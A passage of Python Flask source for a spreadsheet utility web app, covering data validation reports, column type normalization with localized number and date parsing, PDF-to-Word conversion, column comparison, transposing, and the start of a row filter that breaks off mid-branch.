            messages[int(n)].append(message(value))
    errors = [{'row': int(p) + 2, 'errors': messages[n]} for p, n in shown_pos.items()]   # spreadsheet row number

    summary_data = {
        'Metric': ['Total Rows', 'Valid Rows', 'Invalid Rows', 'Error Rate (%)', 'Total Rule Failures'],
        'Value': [total_rows, valid_count, invalid_count,
                  round((invalid_count / total_rows * 100) if total_rows > 0 else 0, 2), failures_total],
    }
    if truncated:
        summary_data['Metric'].append('Note')
        summary_data['Value'].append(f'Details shown for the first {VALIDATION_DETAIL_LIMIT:,} of {invalid_count:,} invalid rows')
    write_valid = valid_count <= VALIDATION_VALID_SHEET_LIMIT
    if not write_valid:
        summary_data['Metric'].append('Note')
        summary_data['Value'].append(f'Valid Records sheet omitted: more than {VALIDATION_VALID_SHEET_LIMIT:,} valid rows '
                                     '(they are your original rows minus the invalid ones)')
    summary_df = pd.DataFrame(summary_data)

    errors_df = (pd.DataFrame([{'Row Number': e['row'], 'Errors': '; '.join(e['errors'])} for e in errors])
                 if errors else pd.DataFrame(columns=['Row Number', 'Errors']))
    invalid_df = df.iloc[shown]
    valid_df = df[~invalid_mask] if valid_count <= VALIDATION_VALID_SHEET_LIMIT else None

    # Save to Excel
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"validation_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    with excel_writer(output_path) as writer:
        summary_df.to_excel(writer, sheet_name='Validation Summary', index=False)
        errors_df.to_excel(writer, sheet_name='Error Details', index=False)
        if len(invalid_df) > 0:
            invalid_df.to_excel(writer, sheet_name='Invalid Records', index=False)
        if write_valid and len(valid_df) > 0:
            valid_df.to_excel(writer, sheet_name='Valid Records', index=False)
        log_frame(make_log('Data Validation', total_rows, valid_count,
                           {'rules': [{k: v for k, v in r.items() if k != 'value'} for r in rules], 'invalid_rows': invalid_count, 'rule_failures': failures_total,
                            'details_truncated': truncated}, session_id)).to_excel(writer, sheet_name=LOG_SHEET, index=False)
        
    download_url = job_download_url(session_id, f"{output_filename}.xlsx")
        
    send_progress('saving', 100, 100, 'Results saved...', 95)
        
    # Prepare preview data
    preview_errors = errors[:50] if len(errors) > 50 else errors
        
    # Clean up
    del df
    os.remove(file_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'summary': {
            'total_rows': int(total_rows),
            'valid_rows': valid_count,
            'invalid_rows': invalid_count,
            'error_rate': round((invalid_count / total_rows * 100) if total_rows > 0 else 0, 2),
            'total_errors': failures_total,
            'errors_total': failures_total,
            'details_truncated': truncated,
            'valid_sheet_omitted': not write_valid,
        },
        'preview': preview_errors
    }
        
    progress_queue.put(final_message)
        
        
@app.route('/validate-data', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def validate_data():
    """Validate data - returns session_id for progress tracking"""
    if 'file' not in request.files:
        return jsonify({'error': 'Please upload a file'}), 400
        
    file = request.files['file']
        
    if file.filename == '':
        return jsonify({'error': 'File must be selected'}), 400
        
    # Validate file extension
    if not file.filename.endswith(('.xlsx', '.xls', '.csv')):
        return jsonify({'error': 'Please upload an Excel or CSV file'}), 400
        
    # Get validation rules
    validation_rules = request.form.get('validation_rules', '[]')
        
    if not validation_rules or validation_rules == '[]':
        return jsonify({'error': 'Please define at least one validation rule'}), 400
        
    # Save file temporarily
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"validate_{timestamp}_{secrets.token_hex(8)}"
        
    filename = secure_filename(file.filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
        
    save_upload(file, file_path, session_id)
        
    progress_queue = open_job(session_id)
    start_job(validate_data_async, file_path, validation_rules, progress_queue, session_id)
        
    return job_started(session_id)
    
@app.route('/column-normalizer')
def column_normalizer():
    return render_template('column_normalizer.html')

_DATE_ORDERS = ('auto', 'MDY', 'DMY', 'YMD')
_NUMERIC_DATE = re.compile(r'(\d{1,4})[/.\-](\d{1,2})[/.\-](\d{1,4})(?:[ T](\d{1,2}):(\d{2})(?::(\d{2}))?)?')
_ISO_DATE = re.compile(r'(\d{4})-(\d{1,2})-(\d{1,2})(?:[ T](\d{1,2}):(\d{2})(?::(\d{2}))?)?')
_TEXT_MONTH_DATE_FORMATS = ('%d %b %Y', '%d %B %Y', '%b %d, %Y', '%B %d, %Y', '%b %d %Y', '%B %d %Y',
                            '%d-%b-%Y', '%d-%b-%y', '%d %b %y')


def parse_localized_number(value, decimal_separator='.'):
    """Number (int or float) for a cell, or None if it is not a number in this notation.

    Strict on purpose: with '.' as the decimal separator "1,234.5" is 1234.5 but "2,5" is NOT a number (it is
    not valid grouping); with ',' "1.234,5" is 1234.5 and "2,5" is 2.5. Grouping must be in threes and may use the
    locale's separator, a space, a no-break space or an apostrophe. Currency symbols and (parentheses) for
    negatives are accepted. Native numbers pass through unchanged; booleans are not numbers.
    """
    if isinstance(value, (bool, np.bool_)):
        return None
    if isinstance(value, (int, float, np.integer, np.floating)):
        return None if pd.isna(value) else (int(value) if isinstance(value, np.integer) else
                                            float(value) if isinstance(value, np.floating) else value)
    if not isinstance(value, str):
        return None
    text = value.replace(' ', ' ').strip()
    negative = text.startswith('(') and text.endswith(')')
    if negative:
        text = text[1:-1]
    text = text.strip(' $€£¥')
    if not text:
        return None
    if decimal_separator == ',':
        grouping, point = r"[.  ']", ','
    else:
        grouping, point = r"[,  ']", r'\.'
    match = re.fullmatch(rf"([+-]?)(\d{{1,3}}(?:{grouping}\d{{3}})+|\d*)(?:{point}(\d+))?(?:[eE]([+-]?\d+))?", text)
    if not match or not (match.group(2) or match.group(3)):
        return None
    sign, whole, fraction, exponent = match.groups()
    digits = re.sub(r'\D', '', whole) or '0'
    number = f"{sign}{digits}" + (f".{fraction}" if fraction is not None else '') + (f"e{exponent}" if exponent else '')
    parsed = float(number) if (fraction is not None or exponent) else int(number)
    if isinstance(parsed, float) and not math.isfinite(parsed):
        return None        # '1e999' overflows to infinity, which is not a value anyone typed
    return -parsed if negative else parsed


def _build_date(year, month, day, hour=0, minute=0, second=0):
    if year < 100:
        year += 2000 if year < 69 else 1900
    try:
        return datetime(year, month, day, hour, minute, second)
    except ValueError:
        return None


def detect_date_order(values):
    """'MDY' or 'DMY' if the column's own values settle it, None if nothing numeric-ambiguous is present,
    raises ValueError if the values contradict each other or are all ambiguous (every part <= 12)."""
    day_first, month_first, ambiguous = 0, 0, []
    for value in values:
        if not isinstance(value, str):
            continue
        text = value.strip()
        if _ISO_DATE.fullmatch(text):
            continue
        m = _NUMERIC_DATE.fullmatch(text)
        if not m or len(m.group(1)) == 4:
            continue
        first, second = int(m.group(1)), int(m.group(2))
        if first > 12 >= second:
            day_first += 1
        elif second > 12 >= first:
            month_first += 1
        elif first <= 12 and second <= 12 and first != second:
            ambiguous.append(text)
    if day_first and month_first:
        raise UserError("This column mixes day-first and month-first dates (for example 13/02/2024 and 02/13/2024). "
                         "Fix the source or normalize those rows separately.")
    if day_first:
        return 'DMY'
    if month_first:
        return 'MDY'
    if ambiguous:
        shown = ', '.join(dict.fromkeys(ambiguous[:3]))
        raise UserError(f"The date order is ambiguous (for example {shown}): it could be day-first or month-first. "
                         f"Choose 'Month first' or 'Day first' under Date order.")
    return None


def parse_date(value, order):
    """datetime for a cell, or None if it is not a date. order is 'MDY', 'DMY' or 'YMD' for numeric dates."""
    if isinstance(value, (datetime, pd.Timestamp)):
        return value.to_pydatetime() if isinstance(value, pd.Timestamp) else value
    if not isinstance(value, str):
        return None
    text = ' '.join(value.split())
    iso = _ISO_DATE.fullmatch(text)
    if iso:
        return _build_date(*(int(g) for g in iso.groups() if g is not None))
    numeric = _NUMERIC_DATE.fullmatch(text)
    if numeric:
        a, b, c = int(numeric.group(1)), int(numeric.group(2)), int(numeric.group(3))
        clock = [int(g) for g in numeric.groups()[3:] if g is not None]
        if len(numeric.group(1)) == 4 or order == 'YMD':
            return _build_date(a, b, c, *clock)
        if order == 'DMY':
            return _build_date(c, b, a, *clock)
        if order == 'MDY':
            return _build_date(c, a, b, *clock)
        return None
    for fmt in _TEXT_MONTH_DATE_FORMATS:
        try:
            return datetime.strptime(text, fmt)
        except ValueError:
            continue
    return None


def normalize_series(series, target_type, trim_whitespace=False, decimal_separator='.', date_order='auto'):
    """Convert one column. Returns (new_series, converted_count, error_count, examples_of_failures).

    A value that cannot be converted keeps its original value and is counted as an error; nothing is ever
    overwritten with a blank. Blanks stay blank."""
    values = series.to_numpy(dtype=object)
    blank = pd.isna(series).to_numpy()
    out = values.copy()
    converted = errors = 0
    examples = []

    def fail(value):
        nonlocal errors
        errors += 1
        if len(examples) < 3:
            examples.append(str(value)[:30])

    if target_type in ('text', 'string'):
        for i, value in enumerate(values):
            if not blank[i]:
                text = value if isinstance(value, str) else str(value)
                out[i] = text.strip() if trim_whitespace else text
                converted += 1
    elif target_type in ('integer', 'float', 'decimal', 'currency', 'dollar', 'percentage'):
        for i, value in enumerate(values):
            if blank[i]:
                continue
            if target_type == 'percentage' and isinstance(value, str) and value.strip().endswith('%'):
                number = parse_localized_number(value.strip()[:-1], decimal_separator)
                number = None if number is None else number / 100.0   # a % sign is what makes it a percentage
            else:
                number = parse_localized_number(value, decimal_separator)
            if number is None:
                fail(value)
            elif target_type == 'integer':
                if isinstance(number, float) and not number.is_integer():
                    fail(value)                                       # never truncate 3.7 to 3
                else:
                    out[i] = int(number)
                    converted += 1
            else:
                out[i] = float(number)
                converted += 1
    elif target_type == 'date':
        order = date_order
        if order == 'auto':
            order = detect_date_order(values[~blank]) or 'MDY'        # only reached when nothing is ambiguous
        for i, value in enumerate(values):
            if blank[i]:
                continue
            parsed = parse_date(value, order)
            if parsed is None:
                fail(value)
            else:
                out[i] = parsed
                converted += 1
    elif target_type == 'boolean':
        for i, value in enumerate(values):
            if blank[i]:
                continue
            text = str(value).lower().strip()
            if isinstance(value, (bool, np.bool_)):
                out[i] = bool(value)
            elif text in ('true', '1', 'yes', 'y', 't'):
                out[i] = True
            elif text in ('false', '0', 'no', 'n', 'f'):
                out[i] = False
            else:
                number = parse_localized_number(value, decimal_separator)
                if number is None:
                    fail(value)
                    continue
                out[i] = number != 0
            converted += 1
    return pd.Series(out, index=series.index, dtype=object), converted, errors, examples


@job_worker('file_path')
def normalize_columns_async(file_path, column_types, trim_whitespace, progress_queue, session_id,
                            decimal_separator='.', date_order='auto'):
    """Normalize column data types in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file...', 5)
        
    # Read file
    df = read_data_file(file_path)
        
    send_progress('loading', 100, 100, f'File loaded: {len(df):,} rows, {len(df.columns)} columns', 15)
        
    send_progress('normalizing', 0, len(df.columns), 'Normalizing columns...', 20)
        
    # Parse column types (JSON string or dict)
    import json
    if isinstance(column_types, str):
        column_types = json.loads(column_types)
        
    normalized_df = df.copy()
    transformations_applied = []
    conversion_failures = []
        
    # Process each column
    for col_idx, (col_name, target_type) in enumerate(column_types.items()):
        if col_name not in normalized_df.columns:
            continue
            
        send_progress('normalizing', col_idx + 1, len(column_types), 
                    f'Normalizing column: {col_name} to {target_type}...', 
                    20 + int((col_idx / len(column_types)) * 60))
            
        normalized_df[col_name], transformed_count, error_count, failed_examples = normalize_series(
            normalized_df[col_name], target_type, trim_whitespace, decimal_separator, date_order)
        if error_count:
            conversion_failures.append((col_name, target_type, error_count, failed_examples))
            
        transformations_applied.append({
            'column': col_name,
            'type': target_type,
            'transformed': transformed_count,
            'errors': error_count
        })
        
    send_progress('saving', 0, 100, 'Saving normalized file...', 85)
        
    # Save to Excel with formatting
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"normalized_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    summary_df = pd.DataFrame({
        'Column': [t['column'] for t in transformations_applied],
        'Target Type': [t['type'] for t in transformations_applied],
        'Rows Transformed': [t['transformed'] for t in transformations_applied],
        'Conversion Errors': [t['errors'] for t in transformations_applied]
    })
    output_path = write_sheets(output_path, [('Normalized Data', normalized_df),
                                             ('Transformation Summary', summary_df)], session_id,
                               log=make_log('Column Normalizer', len(df), len(normalized_df),
                                            {'column_types': column_types, 'trim_whitespace': trim_whitespace,
                                             'decimal_separator': decimal_separator, 'date_order': date_order}, session_id))
    formatted = output_path.endswith('.xlsx')   # cell formatting only applies to the workbook, not CSV files

    if formatted:
        # Apply formatting for currency columns
        from openpyxl import load_workbook
        from openpyxl.styles import Font, PatternFill, Alignment
        from openpyxl.styles.numbers import FORMAT_CURRENCY_USD, FORMAT_PERCENTAGE_00
        
        wb = load_workbook(output_path)
        ws = wb['Normalized Data']
        
        # Format headers
        header_fill = PatternFill(start_color='4472C4', end_color='4472C4', fill_type='solid')
        header_font = Font(bold=True, color='FFFFFF', size=11)
        
        for cell in ws[1]:
            cell.fill = header_fill
            cell.font = header_font
            cell.alignment = Alignment(horizontal='center', vertical='center')
        
        # Apply column-specific formatting (by the column's real position in the sheet)
        for col_name, target_type in column_types.items():
            if col_name not in normalized_df.columns:
                continue
            col_idx = normalized_df.columns.get_loc(col_name) + 1
            if target_type == 'currency' or target_type == 'dollar':
                col_letter = ws.cell(row=1, column=col_idx).column_letter
                for row in range(2, ws.max_row + 1):
                    cell = ws[f'{col_letter}{row}']
                    if cell.value is not None:
                        cell.number_format = FORMAT_CURRENCY_USD
            elif target_type == 'percentage':
                col_letter = ws.cell(row=1, column=col_idx).column_letter
                for row in range(2, ws.max_row + 1):
                    cell = ws[f'{col_letter}{row}']
                    if cell.value is not None:
                        cell.number_format = FORMAT_PERCENTAGE_00
            elif target_type == 'date':
                col_letter = ws.cell(row=1, column=col_idx).column_letter
                for row in range(2, ws.max_row + 1):
                    cell = ws[f'{col_letter}{row}']
                    if cell.value is not None:
                        cell.number_format = 'mm/dd/yyyy'
        
        # Auto-adjust column widths
        for column in ws.columns:
            max_length = 0
            column_letter = column[0].column_letter
            for cell in column:
                try:
                    if len(str(cell.value)) > max_length:
                        max_length = len(str(cell.value))
                except:
                    pass
            adjusted_width = min(max_length + 2, 50)
            ws.column_dimensions[column_letter].width = adjusted_width
        
        wb.save(output_path)
        
    download_url = job_download_url(session_id, os.path.basename(output_path))
        
    send_progress('saving', 100, 100, 'File saved...', 95)
        
    # Store summary data
    total_transformed = sum(t['transformed'] for t in transformations_applied)
    total_errors = sum(t['errors'] for t in transformations_applied)
        
    # Clean up
    del df
    del normalized_df
    os.remove(file_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'summary': {
            'total_columns': len(transformations_applied),
            'total_transformed': int(total_transformed),
            'total_errors': int(total_errors)
        },
        'transformations': transformations_applied
    }
    if conversion_failures:
        parts = [f"{col}: {count} (e.g. {', '.join(repr(x) for x in examples)})"
                 for col, _, count, examples in conversion_failures]
        hint = ''
        if decimal_separator == '.' and any(t in ('integer', 'float', 'decimal', 'currency', 'dollar', 'percentage')
                                            for _, t, _, _ in conversion_failures):
            hint = " If numbers use a comma as the decimal separator (1.234,56), choose the comma number format."
        final_message['warning'] = ("Values that could not be converted were left exactly as they were - "
                                    + '; '.join(parts) + '.' + hint)
        
    progress_queue.put(final_message)
        
        
@app.route('/normalize-columns', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def normalize_columns():
    """Normalize columns - returns session_id for progress tracking"""
    if 'file' not in request.files:
        return jsonify({'error': 'Please upload a file'}), 400
        
    file = request.files['file']
        
    if file.filename == '':
        return jsonify({'error': 'File must be selected'}), 400
        
    # Validate file extension
    if not file.filename.endswith(('.xlsx', '.xls', '.csv')):
        return jsonify({'error': 'Please upload an Excel or CSV file'}), 400
        
    # Get column types mapping
    column_types_json = request.form.get('column_types', '{}')
    trim_whitespace = request.form.get('trim_whitespace', 'false').lower() == 'true'
    decimal_separator = request.form.get('decimal_separator', '.')
    date_order = request.form.get('date_order', 'auto')
    if decimal_separator not in ('.', ','):
        return jsonify({'error': "decimal_separator must be '.' or ','"}), 400
    if date_order not in _DATE_ORDERS:
        return jsonify({'error': f"date_order must be one of: {', '.join(_DATE_ORDERS)}"}), 400
        
    try:
        import json
        column_types = json.loads(column_types_json)
        if not isinstance(column_types, dict):
            return jsonify({'error': 'Invalid column types format'}), 400
    except json.JSONDecodeError:
        return jsonify({'error': 'Invalid JSON format for column types'}), 400
        
    if not column_types:
        return jsonify({'error': 'Please select at least one column to normalize'}), 400
        
    # Save file temporarily
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"normalize_{timestamp}_{secrets.token_hex(8)}"
        
    filename = secure_filename(file.filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
        
    save_upload(file, file_path, session_id)
        
    progress_queue = open_job(session_id)
    start_job(normalize_columns_async, file_path, column_types, trim_whitespace, progress_queue, session_id, decimal_separator, date_order)
        
    return job_started(session_id)
    
@app.route('/pdf-to-word')
def pdf_to_word():
    return render_template('pdf_to_word.html')

@app.route('/column-comparison')
def column_comparison():
    return render_template('column_comparison.html')

@app.route('/transpose')
def transpose():
    return render_template('transpose.html')

@job_worker('file_path')
def convert_pdf_to_word_async(file_path, progress_queue, session_id):
    """Convert PDF to Word document in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading PDF file...', 5)
        
    # Import pdf2docx
    try:
        from pdf2docx import Converter
    except ImportError:
        raise ImportError("pdf2docx library is not installed. Please install it with: pip install pdf2docx")
        
    # Check if file exists
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"PDF file not found: {file_path}")
        
    send_progress('loading', 50, 100, 'PDF file loaded...', 15)
        
    send_progress('converting', 0, 100, 'Converting PDF to Word document...', 20)
        
    # Create output file path
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    base_name = os.path.splitext(os.path.basename(file_path))[0]
    output_filename = f"converted_{timestamp}_{base_name}"
    output_path = job_output_path(session_id, f"{output_filename}.docx")
        
    # Convert PDF to Word
    try:
        cv = Converter(file_path)
        cv.convert(output_path, start=0, end=None)  # Convert all pages
        cv.close()
    except Exception as e:
        raise Exception(f"Error during PDF conversion: {str(e)}")
        
    send_progress('converting', 100, 100, 'Conversion complete!', 85)
        
    send_progress('saving', 0, 100, 'Preparing download...', 90)
        
    # Check if output file was created
    if not os.path.exists(output_path):
        raise FileNotFoundError("Word document was not created successfully")
        
    download_url = job_download_url(session_id, f"{output_filename}.docx")
        
    # Get file size
    file_size = os.path.getsize(output_path)
        
    send_progress('saving', 100, 100, 'Ready for download!', 95)
        
    # Clean up input file
    os.remove(file_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Conversion complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'file_size': file_size
    }
        
    progress_queue.put(final_message)
        
        
@app.route('/convert-pdf-to-word', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def convert_pdf_to_word():
    """Convert PDF to Word - returns session_id for progress tracking"""
    if 'file' not in request.files:
        return jsonify({'error': 'Please upload a PDF file'}), 400
        
    file = request.files['file']
        
    if file.filename == '':
        return jsonify({'error': 'File must be selected'}), 400
        
    # Validate file extension
    if not file.filename.lower().endswith('.pdf'):
        return jsonify({'error': 'Please upload a PDF file'}), 400
        
    # Save file temporarily
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"pdf2word_{timestamp}_{secrets.token_hex(8)}"
        
    filename = secure_filename(file.filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
        
    save_upload(file, file_path, session_id)
        
    progress_queue = open_job(session_id)
    start_job(convert_pdf_to_word_async, file_path, progress_queue, session_id)
        
    return job_started(session_id)
    
@job_worker('file1_path', 'file2_path')
def compare_columns_async(file1_path, file2_path, file1_name, file2_name, progress_queue, session_id):
    """Compare columns from two files in background thread - reads only headers for speed"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, f'Reading headers from {file1_name}...', 10)
        
    columns1 = set(read_headers(file1_path, file1_name))

    send_progress('loading', 50, 100, f'Reading headers from {file2_name}...', 30)

    columns2 = set(read_headers(file2_path, file2_name))

    send_progress('comparing', 0, 100, 'Comparing columns...', 50)
        
    # Get all unique columns (alphabetically sorted)
    all_columns = sorted(columns1.union(columns2))
        
    # Build comparison data
    comparison_data = []
    for col in all_columns:
        comparison_data.append({
            'Column Headers': col,
            f'Found in {file1_name}': 'Yes' if col in columns1 else 'No',
            f'Found in {file2_name}': 'Yes' if col in columns2 else 'No'
        })
        
    comparison_df = pd.DataFrame(comparison_data)
        
    send_progress('saving', 0, 100, 'Saving results...', 80)
        
    # Save to Excel - keep it simple and fast (no formatting for speed)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"column_comparison_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    with excel_writer(output_path) as writer:
        comparison_df.to_excel(writer, sheet_name='Column Comparison', index=False)
            
        # Green for Yes, red for No in the two file columns (conditional formats: no per-cell work, any size)
        log_frame(make_log('Schema Comparison', len(columns1) + len(columns2), len(comparison_df),
                           {'file1': file1_name, 'file2': file2_name}, session_id)).to_excel(
            writer, sheet_name=LOG_SHEET, index=False)
        worksheet = writer.sheets['Column Comparison']
        green = writer.book.add_format({'bg_color': '#90EE90', 'font_color': '#006400', 'bold': True})
        red = writer.book.add_format({'bg_color': '#FFB6C1', 'font_color': '#8B0000', 'bold': True})
        if len(comparison_df):
            last_row = len(comparison_df)
            worksheet.conditional_format(1, 1, last_row, 2, {'type': 'cell', 'criteria': '==', 'value': '"Yes"', 'format': green})
            worksheet.conditional_format(1, 1, last_row, 2, {'type': 'cell', 'criteria': '==', 'value': '"No"', 'format': red})
        
    download_url = job_download_url(session_id, f"{output_filename}.xlsx")
        
    # Clean up uploaded files
    os.remove(file1_path)
    os.remove(file2_path)
        
    # Send completion message with all data (don't send separate 'done' progress update)
    final_message = {
        'stage': 'done',
        'current': len(all_columns),
        'total': len(all_columns),
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'total_columns': len(all_columns),
        'file1_columns': len(columns1),
        'file2_columns': len(columns2),
        'common_columns': len(columns1.intersection(columns2)),
        'file1_only': len(columns1 - columns2),
        'file2_only': len(columns2 - columns1),
        'file1_name': file1_name,
        'file2_name': file2_name,
        'comparison_data': comparison_data  # Include the actual comparison table data
    }
        
    progress_queue.put(final_message)
        
        
@app.route('/compare-columns', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def compare_columns():
    """Compare columns from two uploaded files - returns session_id for progress tracking"""
    if 'file1' not in request.files or 'file2' not in request.files:
        return jsonify({'error': 'Please upload both files'}), 400
        
    file1 = request.files['file1']
    file2 = request.files['file2']
        
    if file1.filename == '' or file2.filename == '':
        return jsonify({'error': 'Both files must be selected'}), 400
        
    # Validate file extensions
    if not (file1.filename.endswith(('.xlsx', '.xls', '.csv')) and 
            file2.filename.endswith(('.xlsx', '.xls', '.csv'))):
        return jsonify({'error': 'Please upload Excel or CSV files'}), 400
        
    # Save files temporarily
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"column_compare_{timestamp}_{secrets.token_hex(8)}"
        
    file1_filename = secure_filename(file1.filename)
    file2_filename = secure_filename(file2.filename)
        
    # Store original filenames for display
    file1_name = os.path.splitext(file1_filename)[0]
    file2_name = os.path.splitext(file2_filename)[0]
        
    file1_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_file1_{file1_filename}")
    file2_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_file2_{file2_filename}")
        
    save_upload(file1, file1_path, session_id)
    save_upload(file2, file2_path, session_id)
        
    progress_queue = open_job(session_id)
    start_job(compare_columns_async, file1_path, file2_path, file1_name, file2_name, progress_queue, session_id)
        
    return job_started(session_id)
    
@job_worker('upload_path')
def transpose_file_async(upload_path, progress_queue, session_id):
    """Transpose Excel/CSV file (rows become columns, columns become rows) in background thread"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file into memory...', 10)
        
    # Read file into memory
    df = read_data_file(upload_path)
        
    original_shape = df.shape
    send_progress('loading', 100, 100, f'File loaded: {original_shape[0]:,} rows × {original_shape[1]:,} columns', 20)
        
    # Every row becomes a column (plus one for the original column names) and a sheet holds 16,384 columns
    if original_shape[0] + 1 > EXCEL_MAX_COLUMNS:
        raise UserError(f"This file has {original_shape[0]:,} rows. Transposing it would create "
                         f"{original_shape[0] + 1:,} columns, but Excel supports at most {EXCEL_MAX_COLUMNS:,} "
                         f"(so at most {EXCEL_MAX_COLUMNS - 1:,} rows). Split the file first.")
        
    send_progress('processing', 0, 100, 'Transposing data (rows ↔ columns)...', 30)
        
    # Transpose the dataframe
    # First, convert the index to a column if it has a name, otherwise use first column as index
    transposed_df = df.T
        
    # If the original dataframe had a numeric index, we need to set proper column names
    # The first row of transposed data should become the column headers
    if df.index.name is None and not df.index.dtype == 'object':
        # Numeric index - use it as first column name
        transposed_df.index.name = 'Original Row'
    elif df.index.name:
        transposed_df.index.name = df.index.name
        
    # Reset index to make the original index/row numbers a column
    transposed_df = transposed_df.reset_index()
        
    # Rename the first column to something descriptive
    if transposed_df.columns[0] == 'index' or transposed_df.columns[0] == 'Original Row':
        transposed_df = transposed_df.rename(columns={transposed_df.columns[0]: 'Original Column/Row'})
        
    new_shape = transposed_df.shape
    send_progress('processing', 100, 100, f'Transposed: {new_shape[0]:,} rows × {new_shape[1]:,} columns', 60)
        
    send_progress('saving', 0, 100, 'Saving transposed file...', 70)
        
    # Save transposed data to Excel
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"transposed_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    with excel_writer(output_path) as writer:
        transposed_df.to_excel(writer, sheet_name='Transposed Data', index=False)
        log_frame(make_log('Transpose', original_shape[0], new_shape[0],
                           {'columns_in': int(original_shape[1]), 'columns_out': int(new_shape[1])},
                           session_id)).to_excel(writer, sheet_name=LOG_SHEET, index=False)
        
    download_url = job_download_url(session_id, f"{output_filename}.xlsx")
        
    # Clean up uploaded file
    os.remove(upload_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': new_shape[0],
        'total': new_shape[0],
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'original_rows': int(original_shape[0]),
        'original_columns': int(original_shape[1]),
        'transposed_rows': int(new_shape[0]),
        'transposed_columns': int(new_shape[1])
    }
        
    progress_queue.put(final_message)
        
        
@app.route('/transpose-data', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def transpose_data():
    """Transpose uploaded file - returns session_id for progress tracking"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file')
        
    session_id, upload_path, filename = store_upload(file, 'transpose')
        
    progress_queue = open_job(session_id)
    start_job(transpose_file_async, upload_path, progress_queue, session_id)
        
    return job_started(session_id)
    
# =============================================================================
# ROW FILTER TOOL
# =============================================================================
@app.route('/row-filter')
def row_filter_page():
    return render_template('row_filter.html')

@app.route('/row-filter', methods=['POST'])
@rate_limit(max_requests=20, window=60)
@api_errors
def row_filter():
    """Filter rows based on conditions"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    # Get conditions
    conditions_json = request.form.get('conditions', '[]')
    preview_only = request.form.get('preview_only', 'false').lower() == 'true'

    try:
        conditions = json.loads(conditions_json)
    except json.JSONDecodeError:
        return jsonify({'error': 'Invalid conditions format'}), 400

    if not conditions:
        return jsonify({'error': 'At least one condition is required'}), 400

    # Generate session ID
    session_id = f"{int(time.time())}_{secrets.token_hex(8)}"
    job_registry.bind(session_id, current_owner())
    filename = secure_filename(file.filename)
    upload_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
    save_upload(file, upload_path, session_id)

    # Read the file
    df = read_data_file(upload_path)
    discard_upload(upload_path)  # contents are loaded; do not keep the file
    original_rows = len(df)

    # Build the filter. Each condition says how it joins the one before it; AND binds tighter than OR, as in SQL:
    # "a OR b AND c" keeps the rows that match a, or match both b and c.
    numeric_operators = {'greater_than': operator_module.gt, 'less_than': operator_module.lt,
                         'greater_equal': operator_module.ge, 'less_equal': operator_module.le}
    groups = []                     # masks to OR together; each entry is a list of masks to AND together
    current_logic = 'AND'

    for condition in conditions:
        column = condition.get('column')
        operator = condition.get('operator')
        value = condition.get('value', '')
        if condition.get('logic'):
            current_logic = condition['logic'].upper()

        if column not in df.columns:
            return jsonify({'error': f'Column "{column}" not found'}), 400

        col_data = df[column]
        blank = col_data.isna() | (col_data.astype(str).str.strip() == '')
        # Text of each cell (a number prints as 5, not 5.0); blank cells stay missing instead of becoming 'nan'
        text = col_data.map(lambda v: v if isinstance(v, str) else (None if pd.isna(v) else _comparable_text(v))).str.lower()
        needle = str(value).lower()

        if operator == 'equals':
